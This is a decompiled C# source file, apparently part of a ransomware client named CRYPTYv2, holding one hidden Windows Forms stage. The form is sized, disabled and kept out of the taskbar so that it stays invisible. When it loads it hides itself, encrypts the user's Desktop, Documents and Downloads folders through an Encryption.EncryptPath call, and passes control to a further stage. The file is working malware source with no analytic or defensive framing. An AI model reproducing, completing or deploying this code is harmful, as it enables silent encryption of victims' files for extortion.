using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using CRYPTYv2_Client.My;
using Microsoft.VisualBasic.CompilerServices;

namespace CRYPTYv2_Client;

[DesignerGenerated]
public class layer4 : Form
{
	private IContainer components;

	public layer4()
	{
		((Form)this).add_Load((EventHandler)layer4_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Control)this).set_Enabled(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("layer4");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("L4");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void layer4_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		Encryption.EncryptPath(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Desktop");
		Encryption.EncryptPath(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Documents");
		Encryption.EncryptPath(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads");
		((Control)MyProject.Forms.layer5).Show();
	}
}
